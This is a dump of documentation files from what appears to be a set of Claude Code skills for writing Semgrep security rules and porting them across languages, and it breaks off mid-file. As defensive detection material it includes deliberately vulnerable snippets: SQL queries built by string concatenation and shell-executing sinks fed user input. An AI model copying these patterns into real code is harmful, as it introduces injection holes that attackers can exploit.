        "plugins/semgrep-rule-creator/skills/semgrep-rule-creator/references/workflow.md": "# Semgrep Rule Creation Workflow\n\nDetailed workflow for creating production-quality Semgrep rules.\n\n## Step 1: Analyze the Problem\n\nBefore writing any code:\n\n1. **Fetch external documentation** - See [Documentation](../SKILL.md#documentation) for required reading\n2. **Understand the exact bug pattern** - What vulnerability, issue or pattern should be detected?\n3. **Identify the target language**\n4. **Determine the approach**:\n   - **Pattern matching**: Syntactic patterns without data flow\n   - **Taint mode**: Data flows from untrusted source to dangerous sink\n\n### When to Use Taint Mode\n\nTaint mode is a powerful feature in Semgrep that can track the flow of data from one location to another. By using taint mode, you can:\n\n- **Track data flow across multiple variables**: Trace how data moves across different variables, functions, components, and identify insecure flow paths (e.g., situations where a specific sanitizer is not used).\n- **Find injection vulnerabilities**: Identify injection vulnerabilities such as SQL injection, command injection, and XSS attacks.\n- **Write simple and resilient Semgrep rules**: Simplify rules that are resilient to code patterns nested in if statements, loops, and other structures.\n\n## Step 2: Write Tests First\n\n**Always write tests before the rule.**\n\n### Directory Structure\n\n```\n<rule-id>/\n <rule-id>.yaml     # Semgrep rule\n <rule-id>.<ext>    # Test file with ruleid/ok annotations\n```\n\n### Test Annotations\n\nSee [quick-reference.md](quick-reference.md#test-file-annotations) for annotation syntax (`ruleid:`, `ok:`, `todoruleid:`, `todook:`).\n\n**CRITICAL**: The comment must be on the line IMMEDIATELY BEFORE the code. Semgrep reports findings on the line after the annotation.\n\n### Test Case Design\n\nYou must include test cases for:\n- Clear vulnerable cases (must match)\n- Clear safe cases (must not match)\n- Edge cases and variations\n- Different coding styles\n- Sanitized/validated input (must not match)\n- Unrelated code (must not match) - normal code with no relation to the rule's target pattern\n- Nested structures (e.g., inside if statements, loops, try/catch blocks, callbacks)\n\n## Step 3: Analyze AST Structure\n\nUnderstanding how Semgrep parses code is crucial for writing precise patterns.\n\n```bash\nsemgrep --dump-ast -l <language> <rule-id>.<ext>\n```\n\nExample output helps understand:\n- How function calls are represented\n- How variables are bound\n- How control flow is structured\n\n## Step 4: Write the Rule\n\nChoose the appropriate pattern operators and write the rule.\n\nFor pattern operator syntax (basic matching, scope operators, metavariable filters, focus), see [quick-reference.md](quick-reference.md).\n\n### Validate and Test\n\n#### Validate YAML Syntax\n\n```bash\nsemgrep --validate --config <rule-id>.yaml\n```\n\n#### Run Tests\n\n```bash\ncd <rule-directory>\nsemgrep --test --config <rule-id>.yaml <rule-id>.<ext>\n```\n\n#### Expected Output\n\n```\n1/1:  All tests passed\n```\n\n#### Debug Failures\n\nIf tests fail, check:\n1. **Missed lines**: Rule didn't match when it should\n   - Pattern too specific\n   - Missing pattern variant\n2. **Incorrect lines**: Rule matched when it shouldn't\n   - Pattern too broad\n   - Need `pattern-not` exclusion\n\n#### Debug Taint Mode Rules\n\n```bash\nsemgrep --dataflow-traces -f <rule-id>.yaml <rule-id>.<ext>\n```\n\nShows:\n- Source locations\n- Sink locations\n- Data flow path\n- Why taint didn't propagate (if applicable)\n\n## Step 5: Iterate Until Tests Pass\n\n**Verification checkpoint**: Proceed to optimization when:\n- \"All tests passed\"\n- No \"missed lines\" (false negatives)\n- No \"incorrect lines\" (false positives)\n\n### Common Fixes\n\n| Problem | Solution |\n|---------|----------|\n| Too many matches | Add `pattern-not` exclusions |\n| Missing matches | Add `pattern-either` variants |\n| Wrong line matched | Adjust `focus-metavariable` |\n| Taint not flowing | Check sanitizers aren't too broad |\n| Taint false positive | Add sanitizer pattern |\n\n## Step 6: Optimize the Rule\n\nAfter all tests pass, analyze and optimize the rule to remove redundant patterns.\n\n### Semgrep Pattern Equivalences\n\nSemgrep treats certain patterns as equivalent:\n\n| Written | Also Matches | Reason |\n|---------|--------------|--------|\n| `\"string\"` | `'string'` | Quote style normalized (in languages where both are equivalent) |\n| `func(...)` | `func()`, `func(a)`, `func(a,b)` | Ellipsis matches zero or more |\n| `func($X, ...)` | `func($X)`, `func($X, a, b)` | Trailing ellipsis is optional |\n\n### Common Redundancies to Remove\n\n**1. Quote Variants** (depends on the language)\n\nBefore:\n```yaml\npattern-either:\n  - pattern: hashlib.new(\"md5\", ...)\n  - pattern: hashlib.new('md5', ...)\n```\n\nAfter:\n```yaml\npattern-either:\n  - pattern: hashlib.new(\"md5\", ...)\n```\n\n**2. Ellipsis Subsets**\n\nBefore:\n```yaml\npattern-either:\n  - pattern: dangerous($X, ...)\n  - pattern: dangerous($X)\n  - pattern: dangerous($X, $Y)\n```\n\nAfter:\n```yaml\npattern: dangerous($X, ...)\n```\n\n**3. Consolidate with Metavariables**\n\nBefore:\n```yaml\npattern-either:\n  - pattern: md5($X)\n  - pattern: sha1($X)\n  - pattern: sha256($X)\n```\n\nAfter:\n```yaml\npatterns:\n  - pattern: $FUNC($X)\n  - metavariable-regex:\n      metavariable: $FUNC\n      regex: ^(md5|sha1|sha256)$\n```\n\n### Optimization Checklist\n\n1. Remove patterns differing only in quote style\n2. Remove patterns that are subsets of `...` patterns\n3. Consolidate similar patterns using metavariable-regex\n4. Remove duplicate patterns in pattern-either\n5. Simplify nested pattern-either when possible\n6. **Re-run tests after each optimization**\n\n### Verify After Optimization\n\n```bash\nsemgrep --test --config <rule-id>.yaml <rule-id>.<ext>\n```\n\n**CRITICAL**: Always re-run tests after optimization. Some \"redundant\" patterns may actually be necessary due to AST structure differences. If any test fails, revert the optimization that caused it.\n\n**Task complete ONLY when**: All tests pass after optimization.\n",
        "plugins/semgrep-rule-variant-creator/.claude-plugin/plugin.json": "{\n  \"name\": \"semgrep-rule-variant-creator\",\n  \"version\": \"1.0.0\",\n  \"description\": \"Creates language variants of existing Semgrep rules with proper applicability analysis and test-driven validation\",\n  \"author\": {\n    \"name\": \"Maciej Domanski\",\n    \"email\": \"opensource@trailofbits.com\"\n  }\n}\n",
        "plugins/semgrep-rule-variant-creator/README.md": "# Semgrep Rule Variant Creator\n\nA Claude Code skill for porting existing Semgrep rules to new target languages with proper applicability analysis and test-driven validation.\n\n## Overview\n\nThis skill takes an existing Semgrep rule and one or more target languages, then generates independent rule variants for each applicable language. Each variant goes through a complete 4-phase cycle:\n\n1. **Applicability Analysis** - Determine if the vulnerability pattern applies to the target language\n2. **Test Creation** - Write test-first with vulnerable and safe cases\n3. **Rule Creation** - Translate patterns and adapt for target language idioms\n4. **Validation** - Ensure all tests pass before proceeding\n\n## Prerequisites\n\n- [Semgrep](https://semgrep.dev/docs/getting-started/) installed and available in PATH\n- Existing Semgrep rule to port (in YAML)\n- Target languages specified\n\n## Usage\n\nInvoke the skill when you want to port an existing Semgrep rule:\n\n```\nPort the sql-injection.yaml Semgrep rule to Go and Java\n```\n\n```\nCreate Semgrep rule variants of my-rule.yaml for TypeScript, Rust, and C#\n```\n\n```\nCreate the same Semgrep rule for JavaScript and Ruby\n```\n\n```\nPort this Semgrep rule to Golang\n```\n\n## Output Structure\n\nFor each applicable target language, the skill produces:\n\n```\n<original-rule-id>-<language>/\n <original-rule-id>-<language>.yaml     # Ported rule\n <original-rule-id>-<language>.<ext>    # Test file\n```\n\n## Example\n\n**Input:**\n- Rule: `python-command-injection.yaml`\n- Target languages: Go, Java\n\n**Output:**\n```\npython-command-injection-golang/\n python-command-injection-golang.yaml\n python-command-injection-golang.go\n\npython-command-injection-java/\n python-command-injection-java.yaml\n python-command-injection-java.java\n```\n\n## Key Differences from semgrep-rule-creator\n\n| Aspect | semgrep-rule-creator | semgrep-rule-variant-creator |\n|--------|---------------------|------------------------------|\n| Input | Bug pattern description | Existing rule + target languages |\n| Output | Single rule+test | Multiple rule+test directories |\n| Workflow | Single creation cycle | Independent cycle per language |\n| Phase 1 | Problem analysis | Applicability analysis |\n\n## Skill Files\n\n- `skills/semgrep-rule-variant-creator/SKILL.md` - Main entry point\n- `skills/semgrep-rule-variant-creator/references/applicability-analysis.md` - Phase 1 guidance\n- `skills/semgrep-rule-variant-creator/references/language-syntax-guide.md` - Pattern translation guidance\n- `skills/semgrep-rule-variant-creator/references/workflow.md` - Detailed 4-phase workflow\n\n## Related Skills\n\n- **semgrep-rule-creator** - Create new Semgrep rules from scratch\n- **static-analysis** - Run existing Semgrep rules against code\n",
        "plugins/semgrep-rule-variant-creator/skills/semgrep-rule-variant-creator/SKILL.md": "---\nname: semgrep-rule-variant-creator\ndescription: Creates language variants of existing Semgrep rules. Use when porting a Semgrep rule to specified target languages. Takes an existing rule and target languages as input, produces independent rule+test directories for each language.\nallowed-tools:\n  - Bash\n  - Read\n  - Write\n  - Edit\n  - Glob\n  - Grep\n  - WebFetch\n---\n\n# Semgrep Rule Variant Creator\n\nPort existing Semgrep rules to new target languages with proper applicability analysis and test-driven validation.\n\n## When to Use\n\n**Ideal scenarios:**\n- Porting an existing Semgrep rule to one or more target languages\n- Creating language-specific variants of a universal vulnerability pattern\n- Expanding rule coverage across a polyglot codebase\n- Translating rules between languages with equivalent constructs\n\n## When NOT to Use\n\nDo NOT use this skill for:\n- Creating a new Semgrep rule from scratch (use `semgrep-rule-creator` instead)\n- Running existing rules against code\n- Languages where the vulnerability pattern fundamentally doesn't apply\n- Minor syntax variations within the same language\n\n## Input Specification\n\nThis skill requires:\n1. **Existing Semgrep rule** - YAML file path or YAML rule content\n2. **Target languages** - One or more languages to port to (e.g., \"Golang and Java\")\n\n## Output Specification\n\nFor each applicable target language, produces:\n```\n<original-rule-id>-<language>/\n <original-rule-id>-<language>.yaml     # Ported Semgrep rule\n <original-rule-id>-<language>.<ext>    # Test file with annotations\n```\n\nExample output for porting `sql-injection` to Go and Java:\n```\nsql-injection-golang/\n sql-injection-golang.yaml\n sql-injection-golang.go\n\nsql-injection-java/\n sql-injection-java.yaml\n sql-injection-java.java\n```\n\n## Rationalizations to Reject\n\nWhen porting Semgrep rules, reject these common shortcuts:\n\n| Rationalization | Why It Fails | Correct Approach |\n|-----------------|--------------|------------------|\n| \"Pattern structure is identical\" | Different ASTs across languages | Always dump AST for target language |\n| \"Same vulnerability, same detection\" | Data flow differs between languages | Analyze target language idioms |\n| \"Rule doesn't need tests since original worked\" | Language edge cases differ | Write NEW test cases for target |\n| \"Skip applicability - it obviously applies\" | Some patterns are language-specific | Complete applicability analysis first |\n| \"I'll create all variants then test\" | Errors compound, hard to debug | Complete full cycle per language |\n| \"Library equivalent is close enough\" | Surface similarity hides differences | Verify API semantics match |\n| \"Just translate the syntax 1:1\" | Languages have different idioms | Research target language patterns |\n\n## Strictness Level\n\nThis workflow is **strict** - do not skip steps:\n- **Applicability analysis is mandatory**: Don't assume patterns translate\n- **Each language is independent**: Complete full cycle before moving to next\n- **Test-first for each variant**: Never write a rule without test cases\n- **100% test pass required**: \"Most tests pass\" is not acceptable\n\n## Overview\n\nThis skill guides the creation of language-specific variants of existing Semgrep rules. Each target language goes through an independent 4-phase cycle:\n\n```\nFOR EACH target language:\n  Phase 1: Applicability Analysis  Verdict\n  Phase 2: Test Creation (Test-First)\n  Phase 3: Rule Creation\n  Phase 4: Validation\n  (Complete full cycle before moving to next language)\n```\n\n## Foundational Knowledge\n\n**The `semgrep-rule-creator` skill is the authoritative reference for Semgrep rule creation fundamentals.** While this skill focuses on porting existing rules to new languages, the core principles of writing quality rules remain the same.\n\nConsult `semgrep-rule-creator` for guidance on:\n- **When to use taint mode vs pattern matching** - Choosing the right approach for the vulnerability type\n- **Test-first methodology** - Why tests come before rules and how to write effective test cases\n- **Anti-patterns to avoid** - Common mistakes like overly broad or overly specific patterns\n- **Iterating until tests pass** - The validation loop and debugging techniques\n- **Rule optimization** - Removing redundant patterns after tests pass\n\nWhen porting a rule, you're applying these same principles in a new language context. If uncertain about rule structure or approach, refer to `semgrep-rule-creator` first.\n\n## Four-Phase Workflow\n\n### Phase 1: Applicability Analysis\n\nBefore porting, determine if the pattern applies to the target language.\n\n**Analysis criteria:**\n1. Does the vulnerability class exist in the target language?\n2. Does an equivalent construct exist (function, pattern, library)?\n3. Are the semantics similar enough for meaningful detection?\n\n**Verdict options:**\n- `APPLICABLE`  Proceed with variant creation\n- `APPLICABLE_WITH_ADAPTATION`  Proceed but significant changes needed\n- `NOT_APPLICABLE`  Skip this language, document why\n\nSee [applicability-analysis.md]({baseDir}/references/applicability-analysis.md) for detailed guidance.\n\n### Phase 2: Test Creation (Test-First)\n\n**Always write tests before the rule.**\n\nCreate test file with target language idioms:\n- Minimum 2 vulnerable cases (`ruleid:`)\n- Minimum 2 safe cases (`ok:`)\n- Include language-specific edge cases\n\n```go\n// ruleid: sql-injection-golang\ndb.Query(\"SELECT * FROM users WHERE id = \" + userInput)\n\n// ok: sql-injection-golang\ndb.Query(\"SELECT * FROM users WHERE id = ?\", userInput)\n```\n\n### Phase 3: Rule Creation\n\n1. **Analyze AST**: `semgrep --dump-ast -l <lang> test-file`\n2. **Translate patterns** to target language syntax\n3. **Update metadata**: language key, message, rule ID\n4. **Adapt for idioms**: Handle language-specific constructs\n\nSee [language-syntax-guide.md]({baseDir}/references/language-syntax-guide.md) for translation guidance.\n\n### Phase 4: Validation\n\n```bash\n# Validate YAML\nsemgrep --validate --config rule.yaml\n\n# Run tests\nsemgrep --test --config rule.yaml test-file\n```\n\n**Checkpoint**: Output MUST show `All tests passed`.\n\nFor taint rule debugging:\n```bash\nsemgrep --dataflow-traces -f rule.yaml test-file\n```\n\nSee [workflow.md]({baseDir}/references/workflow.md) for detailed workflow and troubleshooting.\n\n## Quick Reference\n\n| Task | Command |\n|------|---------|\n| Run tests | `semgrep --test --config rule.yaml test-file` |\n| Validate YAML | `semgrep --validate --config rule.yaml` |\n| Dump AST | `semgrep --dump-ast -l <lang> <file>` |\n| Debug taint flow | `semgrep --dataflow-traces -f rule.yaml file` |\n\n\n## Key Differences from Rule Creation\n\n| Aspect | semgrep-rule-creator | This skill |\n|--------|---------------------|------------|\n| Input | Bug pattern description | Existing rule + target languages |\n| Output | Single rule+test | Multiple rule+test directories |\n| Workflow | Single creation cycle | Independent cycle per language |\n| Phase 1 | Problem analysis | Applicability analysis per language |\n| Library research | Always relevant | Optional (when original uses libraries) |\n\n## Documentation\n\n**REQUIRED**: Before porting rules, read relevant Semgrep documentation:\n\n- [Rule Syntax](https://semgrep.dev/docs/writing-rules/rule-syntax) - YAML structure and operators\n- [Pattern Syntax](https://semgrep.dev/docs/writing-rules/pattern-syntax) - Pattern matching and metavariables\n- [Pattern Examples](https://semgrep.dev/docs/writing-rules/pattern-examples) - Per-language pattern references\n- [Testing Rules](https://semgrep.dev/docs/writing-rules/testing-rules) - Testing annotations\n- [Trail of Bits Testing Handbook](https://appsec.guide/docs/static-analysis/semgrep/advanced/) - Advanced patterns\n\n## Next Steps\n\n- For applicability analysis guidance, see [applicability-analysis.md]({baseDir}/references/applicability-analysis.md)\n- For language translation guidance, see [language-syntax-guide.md]({baseDir}/references/language-syntax-guide.md)\n- For detailed workflow and examples, see [workflow.md]({baseDir}/references/workflow.md)\n",
        "plugins/semgrep-rule-variant-creator/skills/semgrep-rule-variant-creator/references/applicability-analysis.md": "# Applicability Analysis\n\nPhase 1 of the variant creation workflow. Before porting a rule, analyze whether the vulnerability pattern applies to the target language.\n\n## Analysis Process\n\nFor EACH target language, answer these questions:\n\n### 1. Does the Vulnerability Class Exist?\n\n**Determine if the vulnerability type is possible in the target language.**\n\nExamples:\n- Buffer overflow: Applies to C/C++, may apply to Rust (in unsafe blocks), does NOT apply to Python/Java\n- SQL injection: Applies to any language with database access\n- XSS: Applies to any language generating HTML output\n- Memory leak: Relevant in C/C++, less relevant in garbage-collected languages\n- Type confusion: Relevant in dynamically typed languages, less relevant in strongly typed\n\n### 2. Does an Equivalent Construct Exist?\n\n**Identify what the original rule detects and find equivalents.**\n\nParse the original rule to identify:\n- **Sinks**: What dangerous functions/methods does it detect?\n- **Sources**: Where does tainted data originate?\n- **Pattern type**: Is it taint-mode or pattern-matching?\n\nThen research the target language:\n- What are the equivalent dangerous functions?\n- What are the common source patterns?\n- Are there language-specific idioms to consider?\n\n### 3. Are the Semantics Similar Enough?\n\n**Verify the pattern translates meaningfully.**\n\nConsider:\n- Does the vulnerability manifest the same way?\n- Are there language-specific mitigations that change detection needs?\n- Would the ported rule provide actual security value?\n\n## Verdict Format\n\nDocument your analysis for each target language:\n\n```\nTARGET: <language>\nVERDICT: APPLICABLE | APPLICABLE_WITH_ADAPTATION | NOT_APPLICABLE\nREASONING: <specific analysis>\nADAPTATIONS_NEEDED: <if APPLICABLE_WITH_ADAPTATION>\nEQUIVALENT_CONSTRUCTS:\n  - Original: <function/pattern>\n  - Target: <equivalent function/pattern>\n```\n\n## Verdict Definitions\n\n### APPLICABLE\n\nThe pattern translates directly with minor syntax adjustments.\n\n**Criteria:**\n- Equivalent constructs exist with same semantics\n- Vulnerability manifests identically\n- Detection logic remains the same\n\n**Example:**\n```\nOriginal: Python os.system(user_input)\nTarget: Go exec.Command(user_input)\n\nVERDICT: APPLICABLE\nREASONING: Both execute shell commands with user input. Vulnerability is\nidentical (command injection). Detection logic (taint from input to exec)\ntranslates directly.\n```\n\n### APPLICABLE_WITH_ADAPTATION\n\nThe pattern can be ported but requires significant changes.\n\n**Criteria:**\n- Vulnerability class exists but manifests differently\n- Equivalent constructs exist but with different APIs\n- Additional patterns needed for target language idioms\n\n**Example:**\n```\nOriginal: Python pickle.loads(untrusted)\nTarget: Java ObjectInputStream.readObject()\n\nVERDICT: APPLICABLE_WITH_ADAPTATION\nREASONING: Both detect deserialization vulnerabilities but the APIs differ\nsignificantly. Java requires detection of ObjectInputStream creation and\nreadObject() calls, not a single function call.\nADAPTATIONS_NEEDED:\n  - Different sink patterns (readObject vs loads)\n  - May need pattern-inside for ObjectInputStream context\n  - Consider readUnshared() variant\n```\n\n### NOT_APPLICABLE\n\nThe pattern should not be ported to this language.\n\n**Criteria:**\n- Vulnerability class doesn't exist in target language\n- No equivalent construct exists\n- Pattern would be meaningless or misleading\n\n**Example:**\n```\nOriginal: C buffer overflow detection\nTarget: Python\n\nVERDICT: NOT_APPLICABLE\nREASONING: Python handles memory management automatically. Buffer overflows\nin the traditional C sense don't exist. The vulnerability class is not\npresent in the target language.\n```\n\n## Common Applicability Patterns\n\n### Always Translate (Language-Agnostic Vulnerabilities)\n\nThese vulnerability classes exist across most languages:\n- SQL injection (any language with DB access)\n- Command injection (any language with shell execution)\n- Path traversal (any language with file operations)\n- SSRF (any language with HTTP clients)\n- XSS (any language generating HTML)\n\n### Sometimes Translate (Context-Dependent)\n\nThese require careful analysis:\n- Deserialization: Different mechanisms per language\n- Cryptographic weaknesses: Language-specific crypto libraries\n- Race conditions: Depends on concurrency model\n- Integer overflow: Depends on type system\n\n### Rarely Translate (Language-Specific)\n\nThese are often NOT_APPLICABLE for other languages:\n- Memory corruption (C/C++ specific)\n- Type juggling (PHP specific)\n- Prototype pollution (JavaScript specific)\n- GIL-related issues (Python specific)\n\n## Library-Specific Rules\n\nWhen the original rule targets a third-party library:\n\n### Step 1: Identify the Library's Purpose\n\nWhat functionality does the library provide?\n- ORM / Database access\n- HTTP client/server\n- Serialization\n- Templating\n- etc.\n\n### Step 2: Research Target Language Ecosystem\n\nFor the target language, identify:\n- Standard library equivalents\n- Popular third-party libraries with same functionality\n- Language-specific idioms for this functionality\n\n### Step 3: Decide on Scope\n\nOptions:\n- **Native constructs only**: Port to standard library equivalents\n- **Popular library**: Port to the most common library in target ecosystem\n- **Multiple variants**: Create separate rules for multiple libraries\n\n**Recommendation**: Start with standard library or most popular option. Additional library variants can be created separately if needed.\n\n## Analysis Checklist\n\nBefore proceeding past Phase 1:\n\n- [ ] Parsed original rule and identified pattern type\n- [ ] Identified sinks, sources, and sanitizers (if taint mode)\n- [ ] Researched equivalent constructs in target language\n- [ ] Documented verdict with specific reasoning\n- [ ] If APPLICABLE_WITH_ADAPTATION, listed required changes\n- [ ] If NOT_APPLICABLE, documented clear explanation\n\n## Example Analysis\n\n**Original Rule**: Python command injection via subprocess\n\n```yaml\nrules:\n  - id: python-command-injection\n    mode: taint\n    languages: [python]\n    pattern-sources:\n      - pattern: request.args.get(...)\n    pattern-sinks:\n      - pattern: subprocess.call($CMD, shell=True, ...)\n```\n\n**Target**: Go\n\n```\nTARGET: Go\nVERDICT: APPLICABLE_WITH_ADAPTATION\n\nREASONING:\n- Command injection exists in Go (vulnerability class present)\n- Go uses exec.Command() and exec.CommandContext() for command execution\n- Go doesn't have shell=True equivalent; commands run directly by default\n- Shell execution in Go requires explicit bash -c wrapping\n\nEQUIVALENT_CONSTRUCTS:\n  - Original sink: subprocess.call(cmd, shell=True)\n  - Target sinks:\n    - exec.Command(\"bash\", \"-c\", cmd)\n    - exec.Command(\"sh\", \"-c\", cmd)\n    - exec.Command(cmd) when cmd comes from user input\n\nADAPTATIONS_NEEDED:\n1. Different sink patterns for Go's exec package\n2. Source patterns need Go HTTP handler equivalents (r.URL.Query(), r.FormValue())\n3. Consider both direct exec.Command and shell-wrapped variants\n```\n\n**Target**: Java\n\n```\nTARGET: Java\nVERDICT: APPLICABLE\n\nREASONING:\n- Command injection exists in Java (vulnerability class present)\n- Java uses Runtime.exec() and ProcessBuilder for command execution\n- Direct equivalent functionality available\n\nEQUIVALENT_CONSTRUCTS:\n  - Original sink: subprocess.call(cmd, shell=True)\n  - Target sinks:\n    - Runtime.getRuntime().exec(cmd)\n    - new ProcessBuilder(cmd).start()\n\nADAPTATIONS_NEEDED:\n- Source patterns need Java servlet equivalents (request.getParameter())\n- Consider both Runtime.exec and ProcessBuilder patterns\n```\n",
        "plugins/semgrep-rule-variant-creator/skills/semgrep-rule-variant-creator/references/language-syntax-guide.md": "# Language Syntax Translation Guide\n\nGuidance for translating Semgrep patterns between languages. This is NOT a pre-built mappinguse these principles to research and adapt patterns for your specific case.\n\n## General Translation Principles\n\n### 1. Never Assume Syntax Equivalence\n\nWhat looks similar may parse differently:\n\n```python\n# Python: method call on object\nobj.method(arg)\n\n# Go: might be method OR field access + function call\nobj.Method(arg)      # Method call\nobj.Field(arg)       # Field holding function, then called\n```\n\n**Always dump the AST** for your target language to see the actual structure.\n\n### 2. Research Before Translating\n\nFor each construct in the original rule:\n1. Search target language documentation for equivalent\n2. Look for multiple ways the same thing can be written\n3. Check if language idioms differ significantly\n\n### 3. Preserve Detection Intent, Not Literal Syntax\n\nThe goal is detecting the same vulnerability, not matching identical syntax.\n\n```yaml\n# Original (Python) - detects eval of user input\npattern: eval($USER_INPUT)\n\n# Go doesn't have eval() - what's the equivalent danger?\n# Research shows: template execution, reflect-based eval, etc.\n# Adapt to what actually creates the vulnerability in Go\n```\n\n## AST Analysis\n\n### Always Dump the AST\n\n```bash\nsemgrep --dump-ast -l <target-language> test-file\n```\n\nCompare how similar constructs are represented:\n\n```python\n# Python\ncursor.execute(query)\n```\n\n```go\n// Go\ndb.Query(query)\n```\n\nThe AST structure may differ significantly even for conceptually similar operations.\n\n### Key Differences to Watch\n\n| Aspect | May Differ |\n|--------|-----------|\n| Method calls | Receiver position, syntax |\n| Function arguments | Named vs positional, defaults |\n| String handling | Interpolation, concatenation |\n| Error handling | Exceptions vs return values |\n| Imports | How namespaces work |\n\n## Metavariable Adaptation\n\n### Metavariables Work Cross-Language\n\nSemgrep metavariables (`$X`, `$FUNC`, etc.) work in all languages:\n\n```yaml\n# Works in Python\npattern: $OBJ.execute($QUERY)\n\n# Works in Java\npattern: $OBJ.executeQuery($QUERY)\n\n# Works in Go\npattern: $DB.Query($QUERY, ...)\n```\n\n### Ellipsis Behavior\n\n`...` matches language-appropriate constructs:\n- In Python: matches arguments, statements\n- In Go: matches arguments, statements (handles multi-return)\n- In Java: matches arguments, statements, annotations\n\n## Common Translation Categories\n\n### Database Queries\n\n**Research for your target language:**\n- Standard library database package\n- Popular ORM frameworks\n- Raw query execution methods\n\nCommon patterns to look for:\n- Query execution methods\n- Prepared statement patterns\n- String interpolation into queries\n\n### Command Execution\n\n**Research for your target language:**\n- Standard library process/exec package\n- Shell execution vs direct execution\n- Argument passing (array vs string)\n\n### File Operations\n\n**Research for your target language:**\n- File open/read/write APIs\n- Path construction methods\n- Directory traversal patterns\n\n### HTTP Handling\n\n**Research for your target language:**\n- Request parameter access\n- Header access\n- Body parsing\n\n## Researching Equivalents\n\n### Step 1: Identify What the Original Detects\n\nParse the original rule:\n- What function/method is the sink?\n- What's the vulnerability being detected?\n- What makes it dangerous?\n\n### Step 2: Search Target Language Docs\n\nSearch for:\n- `\"<target language> <functionality>\"` (e.g., \"golang exec command\")\n- `\"<target language> <vulnerability>\"` (e.g., \"java sql injection\")\n- Standard library documentation\n- [Semgrep Pattern Examples](https://semgrep.dev/docs/writing-rules/pattern-examples) - Per-language pattern references\n\n### Step 3: Find All Variants\n\nA single Python function may have multiple equivalents:\n\n```python\n# Python has one main way\nos.system(cmd)\n```\n\n```java\n// Java has multiple\nRuntime.getRuntime().exec(cmd);\nnew ProcessBuilder(cmd).start();\nProcessBuilder.command(cmd).start();\n```\n\nInclude all common variants in your rule.\n\n### Step 4: Check for Idioms\n\nLanguages have preferred patterns:\n\n```python\n# Python: often inline\ncursor.execute(f\"SELECT * FROM users WHERE id = {user_id}\")\n```\n\n```go\n// Go: typically uses placeholders\ndb.Query(\"SELECT * FROM users WHERE id = ?\", userID)\n// Vulnerability is when they DON'T use placeholders\ndb.Query(\"SELECT * FROM users WHERE id = \" + userID)\n```\n\n## Source Pattern Translation\n\n### Web Framework Sources\n\nOriginal rule sources need framework-specific translation:\n\n```yaml\n# Python Flask\npattern: request.args.get(...)\n\n# Java Servlet\npattern: $REQUEST.getParameter(...)\n\n# Go net/http\npattern: $R.URL.Query().Get(...)\npattern: $R.FormValue(...)\n\n# Node.js Express\npattern: $REQ.query.$PARAM\npattern: $REQ.body.$PARAM\n```\n\n### User Input Sources\n\nResearch common input sources for target language, for example:\n- HTTP request parameters\n- Command line arguments\n- Environment variables\n- File reads\n- Standard input\n\n## Sanitizer Translation\n\n### Research Sanitization Patterns\n\nEach language has different sanitization approaches:\n\n```python\n# Python\nshlex.quote(cmd)  # Shell escaping\nhtml.escape(s)    # HTML escaping\n```\n\n```go\n// Go\ntemplate.HTMLEscapeString(s)\n// Prepared statements (implicit sanitization)\ndb.Query(\"SELECT ... WHERE id = ?\", id)\n```\n\n```java\n// Java\nStringEscapeUtils.escapeHtml4(s)\nPreparedStatement (implicit sanitization)\n```\n\n## Import/Namespace Considerations\n\n### Pattern May Need Context\n\nSome languages require matching imports:\n\n```yaml\n# Python - function in global namespace after import\npattern: pickle.loads(...)\n\n# Java - may need full path or import context\npattern: java.io.ObjectInputStream\npattern: ObjectInputStream\n```\n\n### When to Use Full Paths\n\n- When function name is common/ambiguous\n- When you want to match specific library\n- When namespace matters for security\n\n## Testing Your Translation\n\n### Verify with AST Dump\n\nAfter writing test cases, verify patterns match:\n\n```bash\n# Dump AST of test file\nsemgrep --dump-ast -l <lang> test-file\n\n# Compare with your pattern\n# Adjust pattern to match AST structure\n```\n\n### Test Edge Cases\n\nEach language has unique edge cases:\n- Different string types (Go: string vs []byte)\n- Different call syntaxes (method chaining)\n- Different argument patterns\n\n## Example: Translating SQL Injection Rule\n\n**Original (Python):**\n```yaml\npattern-sinks:\n  - pattern: $CURSOR.execute($QUERY, ...)\n```\n\n**Research for Go:**\n1. Standard database package: `database/sql`\n2. Query methods: `Query`, `QueryRow`, `Exec`, `QueryContext`, etc.\n3. ORM equivalents: GORM, sqlx, etc.\n\n**Translated (Go - standard library):**\n```yaml\npattern-sinks:\n  - pattern: $DB.Query($QUERY, ...)\n  - pattern: $DB.QueryRow($QUERY, ...)\n  - pattern: $DB.Exec($QUERY, ...)\n  - pattern: $DB.QueryContext($CTX, $QUERY, ...)\n```\n\n**Research for Java:**\n1. JDBC: `Statement`, `PreparedStatement`\n2. Query methods: `executeQuery`, `executeUpdate`, `execute`\n\n**Translated (Java):**\n```yaml\npattern-sinks:\n  - pattern: (Statement $S).executeQuery($QUERY)\n  - pattern: (Statement $S).executeUpdate($QUERY)\n  - pattern: (Statement $S).execute($QUERY)\n```\n\n## Checklist Before Writing Rule\n\n- [ ] Dumped AST for target language test file\n- [ ] Researched equivalent functions/methods\n- [ ] Identified all common variants\n- [ ] Checked for language-specific idioms\n- [ ] Identified appropriate source patterns\n- [ ] Identified appropriate sanitizer patterns\n- [ ] Verified patterns match AST structure\n",
        "plugins/semgrep-rule-variant-creator/skills/semgrep-rule-variant-creator/references/workflow.md": "# Detailed Variant Creation Workflow\n\nComplete step-by-step workflow for porting Semgrep rules to new languages.\n\n## Core Principle: Independent Cycles\n\nEach target language goes through the complete 4-phase cycle independently:\n\n```\nFOR EACH target language:\n  \n   Phase 1: Applicability Analysis                         \n      APPLICABLE? Continue                              \n      NOT_APPLICABLE? Skip to next language             \n                                                           \n   Phase 2: Test Creation (Test-First)                     \n      Create test file with ruleid/ok annotations       \n                                                           \n   Phase 3: Rule Creation                                  \n      Analyze AST, write rule, update metadata          \n                                                           \n   Phase 4: Validation                                     \n      Tests pass? Complete, proceed to next language    \n      Tests fail? Iterate phases 2-4                    \n  \n```\n\n**Do NOT batch**: Complete all phases for one language before starting the next.\n\n## Phase 1: Applicability Analysis\n\n### Step 1.1: Parse the Original Rule\n\nExtract key components:\n\n```yaml\n# Example original rule\nrules:\n  - id: python-sql-injection\n    mode: taint\n    languages: [python]\n    severity: ERROR\n    message: SQL injection vulnerability\n    pattern-sources:\n      - pattern: request.args.get(...)\n    pattern-sinks:\n      - pattern: cursor.execute($QUERY, ...)\n    pattern-sanitizers:\n      - pattern: sanitize(...)\n```\n\nDocument:\n- **Rule ID**: python-sql-injection\n- **Mode**: taint (optional, if taint mode used via `mode: taint`)\n- **Sources**: request.args.get(...) (via `pattern-sources` - if taint analysis mode used)\n- **Sinks**: cursor.execute($QUERY, ...) (via 